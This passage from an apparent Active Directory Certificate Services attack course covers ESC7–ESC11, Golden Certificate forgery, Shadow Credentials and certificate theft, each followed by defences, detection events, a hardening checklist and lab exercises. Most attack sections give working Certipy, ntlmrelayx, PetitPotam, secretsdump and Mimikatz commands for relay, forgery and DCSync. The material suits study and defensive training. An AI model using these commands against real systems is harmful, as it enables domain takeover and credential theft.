  -enable-template 'SubCA'

# Step 4: Request a SubCA certificate (will likely be denied)
certipy req -u 'user@domain.com' -p 'pass' \
  -dc-ip 10.10.10.1 \
  -target ca01.domain.com \
  -ca 'DOMAIN-CA' \
  -template 'SubCA' \
  -upn 'administrator@domain.com'

# Note the request ID from the output (e.g., Request ID: 42)

# Step 5: Approve the pending/denied request
certipy ca -u 'user@domain.com' -p 'pass' \
  -dc-ip 10.10.10.1 \
  -target ca01.domain.com \
  -ca 'DOMAIN-CA' \
  -issue-request 42

# Step 6: Retrieve the issued certificate
certipy req -u 'user@domain.com' -p 'pass' \
  -dc-ip 10.10.10.1 \
  -target ca01.domain.com \
  -ca 'DOMAIN-CA' \
  -retrieve 42

# Step 7: Authenticate
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
```

### Defensive Measures

- Audit CA ACLs — restrict ManageCA and ManageCertificates to dedicated admin accounts
- Remove unnecessary CA permissions from low-privilege groups
- Monitor CA audit logs for permission changes and certificate approval overrides
- Enable CA auditing (certutil -setreg CA\AuditFilter 127)

---

## 12. ESC8 – NTLM Relay to AD CS HTTP Endpoints

### Overview

ESC8 combines NTLM relay attacks with AD CS web enrollment to obtain certificates for relayed accounts. When AD CS has HTTP-based enrollment endpoints (Certificate Enrollment Web Service / CES, or the legacy certsrv web interface) without proper protections, an attacker can relay NTLM authentication from a coerced machine account to the enrollment endpoint and obtain a certificate for that machine — including Domain Controllers.

### How ESC8 Works

The attack flow:

```
Step 1: Attacker identifies AD CS HTTP enrollment endpoint
        (e.g., http://ca01.domain.com/certsrv/certfnsh.asp)

Step 2: Attacker sets up NTLM relay pointing to the AD CS endpoint

Step 3: Attacker coerces a target machine (e.g., Domain Controller) to
        authenticate to the attacker using NTLM
        (PetitPotam, PrinterBug, DFSCoerce, etc.)

Step 4: The DC's NTLM authentication is relayed to the AD CS web endpoint

Step 5: The relay tool submits a certificate request on behalf of the DC's
        machine account using a template that allows computer enrollment

Step 6: The CA issues a certificate for the DC machine account

Step 7: Attacker authenticates as the DC using the certificate, obtaining
        the DC's TGT and NT hash, enabling DCSync
```

### Vulnerability Requirements

1. AD CS has an HTTP-based enrollment endpoint (web enrollment enabled)
2. The endpoint does not enforce HTTPS with Extended Protection for Authentication (EPA)
3. A certificate template exists that allows machine enrollment with Client Authentication EKU
4. The attacker can coerce NTLM authentication from a privileged machine

### Reconnaissance

```bash
# Check if web enrollment is accessible
curl -I http://ca01.domain.com/certsrv/certfnsh.asp
# If you get HTTP 401 with "WWW-Authenticate: NTLM", it's vulnerable

# Certipy will flag ESC8 during enumeration
certipy find -u 'user@domain.com' -p 'pass' -dc-ip 10.10.10.1 -vulnerable
# Look for: Web Enrollment: Enabled and HTTP endpoint without EPA
```

### Exploitation

**Terminal 1: Set up NTLM relay**

```bash
# Using Certipy's built-in relay
certipy relay -target 'http://ca01.domain.com/certsrv/certfnsh.asp' \
  -template 'DomainController'

# OR using Impacket's ntlmrelayx
impacket-ntlmrelayx -t 'http://ca01.domain.com/certsrv/certfnsh.asp' \
  -smb2support --adcs --adcs-template 'DomainController'
```

**Terminal 2: Coerce authentication from the Domain Controller**

```bash
# Using PetitPotam (unauthenticated or authenticated)
python3 PetitPotam.py <attacker_IP> <DC_IP>

# OR using the authenticated version
python3 PetitPotam.py -u 'user' -p 'pass' -d 'domain.com' <attacker_IP> <DC_IP>

# OR using PrinterBug / SpoolSample
python3 printerbug.py 'domain.com/user:pass'@<DC_IP> <attacker_IP>

# OR using DFSCoerce
python3 dfscoerce.py -u 'user' -p 'pass' -d 'domain.com' <attacker_IP> <DC_IP>
```

**Terminal 1 output (relay succeeds)**:

```
[*] Got certificate for DC01$
[*] Certificate saved to dc01.pfx
```

**Authenticate with the DC certificate**:

```bash
# Authenticate as the DC machine account
certipy auth -pfx dc01.pfx -dc-ip 10.10.10.1

# Output: DC01$ TGT and NT hash
# Use the hash for DCSync
impacket-secretsdump -hashes <hash> 'domain.com/DC01$'@dc01.domain.com
```

### Defensive Measures

- **Disable HTTP enrollment endpoints** if not required
- **Enable HTTPS** and **require Extended Protection for Authentication (EPA)** on all enrollment endpoints
- **Enable channel binding** on IIS hosting the enrollment service
- Disable NTLM authentication where possible (enforce Kerberos)
- Apply patches for PetitPotam (CVE-2021-36942) and other coercion techniques
- Monitor for unusual certificate enrollment patterns from machine accounts
- Block inbound SMB to workstations and servers from other workstations

---

## 13. ESC9 & ESC10 – Weak Certificate Mapping Attacks

### Overview

ESC9 and ESC10 exploit weaknesses in how domain controllers map certificates to AD accounts. These attacks were discovered after Microsoft's KB5014754 patches and target environments where strong certificate mapping is not fully enforced. Both attacks require the attacker to have GenericWrite permissions over another account.

### ESC9 – No Security Extension on Template

ESC9 targets templates that do not include the new security extension (`szOID_NTDS_CA_SECURITY_EXT`) that Microsoft introduced for strong certificate mapping. The attack:

1. Attacker has GenericWrite over user "VictimUser"
2. Attacker changes VictimUser's UPN to "administrator" (removing the @domain suffix to avoid conflict)
3. Attacker requests a certificate for VictimUser from a template without the security extension
4. Attacker restores VictimUser's original UPN
5. Attacker authenticates with the certificate — the DC maps it to Administrator via UPN

**Requirements**:

- `StrongCertificateBindingEnforcement` is not set to 2 (not full enforcement)
- Template does not include the security extension (CT_FLAG_NO_SECURITY_EXTENSION in msPKI-Enrollment-Flag)
- Template has Client Authentication EKU
- Attacker has GenericWrite over a target account

### ESC10 – Weak Certificate Mapping Methods

ESC10 is similar to ESC9 but exploits the `CertificateMappingMethods` registry key on the domain controller. Two sub-variants exist:

**Case 1: StrongCertificateBindingEnforcement = 0**

When completely disabled, any certificate with a UPN in the SAN is mapped to the account with that UPN, regardless of other checks.

**Case 2: CertificateMappingMethods includes UPN bit (0x4)**

When the Schannel certificate mapping includes UPN mapping, the DC will map certificates based on UPN alone.

### Exploitation (ESC9 Example)

```bash
# Step 1: Check current UPN of victim account
certipy account read -u 'attacker@domain.com' -p 'pass' -dc-ip 10.10.10.1 \
  -user 'VictimUser'

# Step 2: Change VictimUser's UPN to Administrator
certipy account update -u 'attacker@domain.com' -p 'pass' -dc-ip 10.10.10.1 \
  -user 'VictimUser' -upn 'administrator'

# Step 3: Request a certificate as VictimUser (uses their current UPN: administrator)
certipy req -u 'VictimUser@domain.com' -p 'VictimPass' \
  -dc-ip 10.10.10.1 \
  -target ca01.domain.com \
  -ca 'DOMAIN-CA' \
  -template 'VulnerableTemplate'

# Step 4: Restore VictimUser's original UPN
certipy account update -u 'attacker@domain.com' -p 'pass' -dc-ip 10.10.10.1 \
  -user 'VictimUser' -upn 'VictimUser@domain.com'

# Step 5: Authenticate — DC maps certificate UPN "administrator" to the Admin account
certipy auth -pfx victimuser.pfx -domain domain.com -dc-ip 10.10.10.1
```

### Defensive Measures

- **Set StrongCertificateBindingEnforcement = 2** (full enforcement) on all DCs
- **Remove the UPN mapping bit (0x4)** from CertificateMappingMethods
- Ensure all templates include the security extension
- Monitor for UPN changes on accounts (Event ID 4738 - user account change)
- Restrict GenericWrite permissions in AD

---

## 14. ESC11 – NTLM Relay to RPC-Based Enrollment

### Overview

ESC11 is conceptually similar to ESC8 but targets the RPC-based certificate enrollment interface (ICertRequestD/ICertRequestD2 DCOM interface) instead of the HTTP web enrollment endpoint. If the CA's RPC interface does not require packet privacy (encryption), NTLM authentication can be relayed to it.

### How ESC11 Works

Instead of relaying to `http://ca/certsrv/certfnsh.asp` (ESC8), the attacker relays NTLM authentication to the CA's RPC endpoint. The CA uses DCOM/RPC for its primary enrollment interface. If the `IF_ENFORCEENCRYPTICERTREQUEST` flag is not set on the CA, the RPC interface accepts authentication without encryption, making it vulnerable to NTLM relay.

### Reconnaissance

```bash
# Certipy checks for ESC11 during enumeration
certipy find -u 'user@domain.com' -p 'pass' -dc-ip 10.10.10.1 -vulnerable

# Look for:
# Enforce Encryption for Requests: Disabled
```

### Exploitation

```bash
# Set up the relay targeting the CA's RPC interface
certipy relay -target 'rpc://ca01.domain.com' -ca 'DOMAIN-CA' \
  -template 'DomainController'

# Coerce authentication (same methods as ESC8)
python3 PetitPotam.py <attacker_IP> <DC_IP>
```

### Defensive Measures

- Enable `IF_ENFORCEENCRYPTICERTREQUEST` on the CA:

```powershell
certutil -config "ca01\DOMAIN-CA" -setreg CA\InterfaceFlags +IF_ENFORCEENCRYPTICERTREQUEST
net stop certsvc && net start certsvc
```

- Apply the same NTLM relay mitigations as ESC8

---

## 15. Golden Certificate Attack (DPERSIST1)

### Overview

The Golden Certificate attack is the certificate equivalent of a Golden Ticket. If an attacker obtains the CA's private key and certificate, they can forge certificates for any user in the AD forest — offline, without interacting with the CA. These forged certificates are valid for as long as the CA certificate is valid (typically 5+ years) and cannot be revoked because the CA has no record of their issuance.

### How the Golden Certificate Attack Works

```
Step 1: Attacker gains local admin on the CA server
        (via ESC5, lateral movement, or other means)

Step 2: Attacker extracts the CA's certificate and private key
        (stored in DPAPI-protected certificate store or PKCS#12 file)

Step 3: Attacker takes the CA PFX to an offline/attacker-controlled machine

Step 4: Attacker uses the CA key to forge certificates for arbitrary users
        - Specifies any UPN/SAN desired
        - Signs the certificate with the CA's private key
        - The certificate chains to a trusted CA in NTAuthCertificates

Step 5: Attacker authenticates with the forged certificate
        - KDC validates the chain, sees trusted CA, issues TGT
        - Attacker can impersonate any user indefinitely
```

### Why It's Devastating

**Comparison with Golden Ticket:**

|Property|Golden Ticket|Golden Certificate|
|---|---|---|
|Key Material|krbtgt hash|CA private key|
|Extraction Method|DCSync (remote)|Local admin on CA server|
|Forging Location|Offline|Offline|
|Validity Duration|10 years (default TGT)|CA cert validity (5+ years)|
|Detection|Ticket anomalies|Very difficult|
|Remediation|Rotate krbtgt (twice)|Revoke CA cert, rebuild PKI|
|CA Awareness|N/A|CA has no record of forged certs|
|Password Reset|Invalidates TGT|Certificate remains valid|

The remediation difficulty is the critical differentiator. Rotating a krbtgt password is straightforward. Revoking and replacing a CA certificate requires rebuilding the entire PKI infrastructure — re-issuing every certificate in the organization.

### Exploitation

#### Step 1: Extract the CA Certificate and Private Key

```bash
# Using Certipy (requires local admin on CA server)
certipy ca -backup -u 'admin@domain.com' -p 'AdminPass' \
  -dc-ip 10.10.10.1 \
  -target ca01.domain.com \
  -ca 'DOMAIN-CA'

# Output: DOMAIN-CA.pfx (contains CA cert + private key)
```

```powershell
# Using Certify 2.0 on Windows (on the CA server)
Certify.exe forge /ca-cert:C:\path\to\backup\ca-cert.pfx /ca-pass:password

# Or using SharpDPAPI to extract from DPAPI
SharpDPAPI.exe certificates /machine
```

#### Step 2: Forge a Certificate

```bash
# Forge a certificate for the Domain Admin
certipy forge -ca-pfx DOMAIN-CA.pfx \
  -upn 'administrator@domain.com' \
  -subject 'CN=Administrator,CN=Users,DC=domain,DC=com'

# Output: administrator_forged.pfx
```

```powershell
# Using Certify 2.0
Certify.exe forge /ca-cert:DOMAIN-CA.pfx /ca-pass:password /upn:administrator@domain.com /sid:S-1-5-21-XXX-500

# Using ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword password --Subject "CN=Administrator" --SubjectAltName "administrator@domain.com" --NewCertPath admin_forged.pfx --NewCertPassword password
```

#### Step 3: Authenticate with the Forged Certificate

```bash
certipy auth -pfx administrator_forged.pfx -dc-ip 10.10.10.1

# Output: Administrator TGT + NT hash
```

#### Step 4: Full Domain Compromise

```bash
# DCSync with the Administrator credentials
export KRB5CCNAME=administrator.ccache
impacket-secretsdump -k -no-pass domain.com/administrator@dc01.domain.com

# Or use Pass-the-Hash
impacket-secretsdump -hashes <hash> domain.com/administrator@dc01.domain.com
```

### Persistence Considerations

- The forged certificate can be reused indefinitely until the CA certificate expires
- An attacker can forge certificates for different users at different times
- The CA has no record of forged certificates, so they cannot be revoked through normal processes
- Even if the organization detects the compromise and resets all passwords, the forged certificates remain valid

### Defensive Measures

- **Protect CA servers as Tier 0 assets**: Same security as Domain Controllers
- **Use HSM/TPM for CA private keys**: Makes extraction significantly harder
- **Monitor CA backup operations**: Alert on `certsvc` backup commands and CA private key access
- **Implement certificate revocation checking**: Configure CRL/OCSP, though this won't catch certificates the CA doesn't know about
- **Enable OCSP responders**: Configure Microsoft OCSP as an additional validation layer
- **Regular CA security audits**: Verify CA server integrity and access controls
- **Consider offline root CAs**: Keep the root CA offline, only bring online for subordinate CA certificate renewal

---

## 16. Shadow Credentials Attack

### Overview

The Shadow Credentials attack abuses the `msDS-KeyCredentialLink` attribute on AD user or computer objects to install a certificate-based credential. If an attacker has write permissions to this attribute on a target account, they can add a key credential that allows them to authenticate as that account using a certificate — without knowing or changing the account's password.

### How Shadow Credentials Work

Windows Hello for Business and FIDO2 use the `msDS-KeyCredentialLink` attribute to store public keys associated with an account. When a user authenticates, they can present a certificate corresponding to a key stored in this attribute, and the DC will authenticate them via PKINIT.

An attacker with GenericWrite or GenericAll over a target account can:

1. Generate a new key pair
2. Write the public key to the target's `msDS-KeyCredentialLink`
3. Use the private key to request a certificate for the target via PKINIT
4. Authenticate as the target using the certificate

### Prerequisites

- Attacker has GenericWrite, GenericAll, or Write to `msDS-KeyCredentialLink` on the target account
- Domain functional level is Windows Server 2016 or higher
- At least one DC has a certificate for Key Trust authentication
- AD CS is deployed (needed for the PKINIT certificate exchange)

### Exploitation

```bash
# Add a shadow credential to the target account
certipy shadow auto -u 'attacker@domain.com' -p 'pass' \
  -dc-ip 10.10.10.1 \
  -account 'TargetUser'

# Certipy automatically:
# 1. Generates a key pair
# 2. Adds the public key to msDS-KeyCredentialLink
# 3. Requests a certificate via PKINIT
# 4. Authenticates and retrieves the NT hash
# 5. Cleans up by removing the added key credential

# Output: TargetUser's NT hash
```

```bash
# Step-by-step approach for more control
# Step 1: Add the shadow credential
certipy shadow add -u 'attacker@domain.com' -p 'pass' \
  -dc-ip 10.10.10.1 \
  -account 'TargetUser'

# Step 2: Authenticate using the shadow credential
certipy shadow auth -u 'attacker@domain.com' -p 'pass' \
  -dc-ip 10.10.10.1 \
  -account 'TargetUser' \
  -pfx shadow_cred.pfx

# Step 3: Clean up
certipy shadow remove -u 'attacker@domain.com' -p 'pass' \
  -dc-ip 10.10.10.1 \
  -account 'TargetUser' \
  -device-id <device_id>
```

### Defensive Measures

- Monitor modifications to `msDS-KeyCredentialLink` (Event ID 5136 - directory service object modification)
- Restrict who has GenericWrite/GenericAll over user and computer objects
- Use AdminSDHolder to protect privileged accounts
- Audit AD permissions regularly with BloodHound

---

## 17. Certificate Theft Techniques

### Overview

Beyond exploiting misconfigurations to obtain new certificates, attackers can steal existing certificates from compromised systems. Stolen certificates provide persistence and impersonation capabilities.

### THEFT1 – Exporting Certificates via Windows APIs

If a certificate's private key is marked as exportable, it can be exported directly:

```powershell
# Using certutil on the compromised machine
certutil -exportpfx -user my <thumbprint> output.pfx

# Using Mimikatz
mimikatz# crypto::certificates /export /systemstore:USER

# Using Certify
Certify.exe list /storename:my /currentuser
```

### THEFT2 – Extracting User Certificates via DPAPI

User certificates are protected by DPAPI. If you have the user's password or DPAPI master key, you can decrypt and export them:

```powershell
# Using Mimikatz
mimikatz# dpapi::capi /in:"%APPDATA%\Microsoft\SystemCertificates\My\Keys\<keyfile>"
mimikatz# dpapi::capi /in:"%APPDATA%\Microsoft\Crypto\RSA\<SID>\<keyfile>" /masterkey:<key>

# Using SharpDPAPI
SharpDPAPI.exe certificates
SharpDPAPI.exe certificates /password:UserPassword
```

### THEFT3 – Extracting Machine Certificates via DPAPI

Machine certificates are protected by the machine's DPAPI master key. Local admin access is required:

```powershell
# Using Mimikatz (as SYSTEM)
mimikatz# crypto::certificates /export /systemstore:LOCAL_MACHINE

# Using SharpDPAPI
SharpDPAPI.exe certificates /machine
```

### THEFT4 – Extracting Certificates via Active Directory

Certificates are sometimes stored in AD user objects (e.g., in the `userCertificate` attribute). These can be extracted via LDAP:

```bash
# Query for certificates stored in AD
certipy find -u 'user@domain.com' -p 'pass' -dc-ip 10.10.10.1
```

### THEFT5 – Certificate Roaming

Windows Certificate Roaming stores user certificates in AD for roaming profile scenarios. If enabled, certificate private keys may be stored in AD attributes accessible to the user or to privileged accounts.

### Defensive Measures

- Mark certificate private keys as non-exportable
- Use TPM-backed keys for high-value certificates
- Monitor DPAPI operations and certificate exports
- Audit Certificate Roaming configuration
- Implement certificate pinning where possible

---

## 18. Detection and Defensive Measures

### Comprehensive Detection Strategy

#### Windows Event IDs to Monitor

|Event ID|Source|Description|Relevance|
|---|---|---|---|
|4886|Security|Certificate Services received a certificate request|All ESC attacks|
|4887|Security|Certificate Services approved and issued a certificate|All ESC attacks|
|4888|Security|Certificate Services denied a certificate request|ESC7 (pending then approved)|
|4890|Security|Certificate manager settings for CA changed|ESC7|
|4899|Security|Certificate template was updated|ESC4|
|4768|Security|Kerberos TGT was requested|PKINIT authentication|
|4769|Security|Kerberos service ticket was requested|Post-authentication|
|4738|Security|User account was changed|ESC9/10 (UPN modification)|
|5136|Security|Directory service object was modified|Shadow Credentials, template modification|

#### Key Detection Indicators

**ESC1/ESC6 Detection**:

- Event 4887 where the requester and the certificate subject (SAN) are different accounts
- Example: `lowprivuser` requests a certificate with SAN `administrator@domain.com`

**ESC8/ESC11 Detection**:

- Event 4768 with certificate-based authentication from a machine account shortly after Event 4886 certificate request from an unusual source IP
- Machine account TGT requests from non-DC IP addresses

**Golden Certificate Detection**:

- Certificate-based authentication (Event 4768) for certificates not present in the CA's issued certificate database
- Very difficult to detect — focus on prevention

**Shadow Credentials Detection**:

- Event 5136 showing modification of `msDS-KeyCredentialLink` attribute
- Unexpected PKINIT authentication for accounts that don't normally use certificates

### Hardening Checklist

#### Certificate Template Hardening

- [ ] Audit all enabled certificate templates
- [ ] Disable or remove unnecessary templates
- [ ] Remove `ENROLLEE_SUPPLIES_SUBJECT` from authentication templates
- [ ] Restrict enrollment permissions (no Domain Users/Authenticated Users)
- [ ] Enable manager approval for sensitive templates
- [ ] Require authorized signatures where appropriate
- [ ] Avoid Any Purpose EKU — use specific EKUs

#### Certificate Authority Hardening

- [ ] Disable `EDITF_ATTRIBUTESUBJECTALTNAME2` flag on all CAs
- [ ] Enable `IF_ENFORCEENCRYPTICERTREQUEST` on all CAs
- [ ] Restrict ManageCA and ManageCertificates permissions
- [ ] Enable CA auditing (`certutil -setreg CA\AuditFilter 127`)
- [ ] Protect CA servers as Tier 0 assets
- [ ] Use HSM/TPM for CA private keys
- [ ] Disable unnecessary web enrollment endpoints

#### Domain Controller Hardening

- [ ] Set `StrongCertificateBindingEnforcement = 2` (full enforcement)
- [ ] Remove UPN mapping bit from `CertificateMappingMethods`
- [ ] Apply KB5014754 and related patches
- [ ] Enable EPA on all HTTP services

#### Network and Monitoring

- [ ] Disable HTTP enrollment endpoints or enforce HTTPS with EPA
- [ ] Block NTLM where possible; enforce Kerberos
- [ ] Monitor certificate enrollment events (4886, 4887)
- [ ] Alert on SAN mismatches in certificate requests
- [ ] Monitor `msDS-KeyCredentialLink` modifications
- [ ] Monitor template and CA configuration changes
- [ ] Deploy BloodHound or similar tools for regular AD CS audits
- [ ] Use tools like PSPKIAudit or Locksmith for AD CS security assessment

### Automated Auditing Tools

```bash
# Certipy (offensive/defensive dual-use)
certipy find -u 'auditor@domain.com' -p 'pass' -dc-ip 10.10.10.1 -vulnerable

# PSPKIAudit (PowerShell)
Invoke-PKIAudit

# Locksmith (PowerShell - purpose-built AD CS auditor)
Invoke-Locksmith
```

---

## 19. Real-World Scenarios and Case Studies

### Scenario 1: Initial Foothold to Domain Admin via ESC1

**Context**: Red team has compromised a workstation and obtained domain credentials for a help desk user through LLMNR poisoning.

**Attack Chain**:

1. **Enumeration**: Run `certipy find -vulnerable` — discover a template called "WebServerAuth" with ESC1 vulnerability (Domain Users can enroll, enrollee supplies subject, client authentication EKU)
2. **Exploitation**: Request a certificate with administrator UPN using `certipy req -template WebServerAuth -upn administrator@domain.com`
3. **Authentication**: Use `certipy auth -pfx administrator.pfx` to obtain Administrator TGT and NT hash
4. **Impact**: Full domain compromise from a single help desk credential

**Time from foothold to Domain Admin**: ~5 minutes

**Why it worked**: The organization duplicated the built-in "Web Server" template (which has ENROLLEE_SUPPLIES_SUBJECT by default) and added Client Authentication EKU for a web application that needed mutual TLS. They never restricted enrollment permissions from the default Domain Users.

### Scenario 2: ESC8 + PetitPotam Chain

**Context**: Red team has network access and one low-privilege domain credential. No ESC1-vulnerable templates exist, but AD CS web enrollment is enabled over HTTP.

**Attack Chain**:

1. **Enumeration**: `certipy find -vulnerable` shows ESC8 — web enrollment enabled, HTTP accessible
2. **Relay Setup**: `certipy relay -target http://ca01.domain.com/certsrv/certfnsh.asp -template Machine`
3. **Coercion**: `python3 PetitPotam.py <attacker_IP> <DC_IP>` — forces DC to authenticate to attacker
4. **Relay**: DC's NTLM authentication is relayed to the CA, obtaining a certificate for the DC machine account
5. **Authentication**: `certipy auth -pfx dc01.pfx` — obtain DC's TGT and NT hash
6. **DCSync**: `impacket-secretsdump` using DC's credentials to dump all domain hashes

**Why it worked**: The CA had the default IIS configuration with web enrollment enabled. EPA was not configured. PetitPotam was unpatched.

### Scenario 3: Golden Certificate Persistence

**Context**: Red team has achieved Domain Admin via ESC1 and wants to establish persistent access that survives credential rotation.

**Attack Chain**:

1. **CA Compromise**: Use Domain Admin credentials to access the CA server
2. **Key Extraction**: `certipy ca -backup` — extract CA certificate and private key
3. **Golden Certificate Forge**: `certipy forge -ca-pfx CA.pfx -upn administrator@domain.com` — create forged certificate
4. **Validation**: `certipy auth -pfx administrator_forged.pfx` — confirm authentication works
5. **Persistence**: Store the CA PFX securely. Forge certificates on demand for any user.

**Blue team response**: The organization detected the ESC1 attack, reset all passwords, and disabled the vulnerable template. However, the attacker retained access through the Golden Certificate.

**Why it persisted**: Password resets don't invalidate certificates. The only way to remediate a Golden Certificate is to revoke the CA certificate and rebuild the PKI — a massive operational undertaking that most organizations can't perform quickly.

### Scenario 4: ESC4 Template Modification (Stealthy Approach)

**Context**: During enumeration, BloodHound reveals that a compromised user has GenericWrite over a certificate template called "InternalApp". The template itself is not directly vulnerable.

**Attack Chain**:

1. **Save Original Config**: `certipy template -template InternalApp -save-old`
2. **Modify Template**: `certipy template -template InternalApp -write-default-configuration` — adds ESC1 conditions
3. **Exploit**: Request certificate with admin UPN
4. **Restore Template**: `certipy template -template InternalApp -configuration InternalApp.json` — restore original config
5. **Authenticate**: Use the obtained certificate

**Why it's stealthy**: The template was only modified for the brief window needed to request the certificate. If the organization doesn't have continuous monitoring on template changes, the modification goes unnoticed.

---

## Common Student Pitfalls to Address

- Confusing CA certificates with issued certificates — the CA cert is the signing key, issued certificates are what users receive
- Not understanding that certificate-based authentication bypasses password requirements entirely
- Forgetting to check the StrongCertificateBindingEnforcement registry key before assuming ESC1 will work
- Not recognizing that ESC8 requires a coercion technique — the relay alone isn't enough
- Assuming password resets remediate certificate-based attacks (they don't)
- Overlooking that Golden Certificates persist even after the vulnerable template is fixed
- Not saving and restoring template configurations during ESC4 exploitation (bad OPSEC)
- Confusing `certipy find` (enumeration) with `certipy req` (certificate request)
- Not checking if web enrollment endpoints exist before attempting ESC8

## Practical Exercises

**Exercise 1**: AD CS Enumeration Challenge

- Students receive low-privilege credentials in a lab environment
- Must use Certipy to enumerate all CAs, templates, and identify all ESC vulnerabilities
- Document findings in a structured report

**Exercise 2**: ESC1 Exploitation

- Identify the vulnerable template and exploit ESC1 to obtain Domain Admin
- Practice the full chain: enumerate → request → authenticate → DCSync
- Test with both compatibility mode and full enforcement certificate mapping

**Exercise 3**: ESC8 Relay Attack

- Set up NTLM relay targeting the AD CS web enrollment endpoint
- Use PetitPotam to coerce DC authentication
- Obtain DC certificate and achieve domain compromise

**Exercise 4**: Golden Certificate Persistence

- After achieving Domain Admin, extract the CA private key
- Forge certificates for multiple users
- Demonstrate that forged certificates survive password resets

**Exercise 5**: ESC4 Stealth Attack

- Identify a template with writable permissions
- Modify, exploit, and restore the template
- Compare AD audit logs before and after to understand detection opportunities

**Exercise 6**: Blue Team Detection

- Students review logs from attack simulations
- Identify indicators of ESC1, ESC8, and Shadow Credentials attacks
- Write detection rules for SIEM (Splunk/Elastic queries)
- Recommend and implement hardening measures

## Assessment Ideas

- Capture-the-flag challenge: Escalate from domain user to Domain Admin using AD CS attacks
- Attack path documentation with screenshots and tool output
- Defensive hardening report: Audit a lab environment and provide remediation steps
- Tool comparison: When to use Certipy vs. Certify vs. manual LDAP queries
- Incident response exercise: Respond to a Golden Certificate compromise

---

## Recommended Resources

**Foundational Research**:

- "Certified Pre-Owned" whitepaper by Will Schroeder & Lee Christensen (SpecterOps, 2021)
- Certipy Wiki by Oliver Lyak (ESC1-ESC16 documentation)

**Tools**:

- Certipy (Python): https://github.com/ly4k/Certipy
- Certify 2.0 (C#): https://github.com/GhostPack/Certify
- ForgeCert (C#): https://github.com/GhostPack/ForgeCert
- PSPKIAudit (PowerShell): https://github.com/GhostPack/PSPKIAudit
- Locksmith (PowerShell): AD CS auditing tool
- BloodHound: Attack path visualization with AD CS support

**Lab Environments**:

- GOAD (Game of Active Directory): Includes AD CS misconfigurations for ESC1-ESC16 practice
- Hack The Box: Multiple machines featuring AD CS attacks
- Custom lab: Windows Server with AD CS role + misconfigurated templates

---

**END OF COURSE**

This completes the comprehensive AD CS Attacks course. You now have the knowledge to understand, enumerate, exploit, detect, and defend against certificate-based attacks in Active Directory environments. Remember: AD CS misconfigurations are one of the most common and impactful privilege escalation paths in modern enterprise networks.
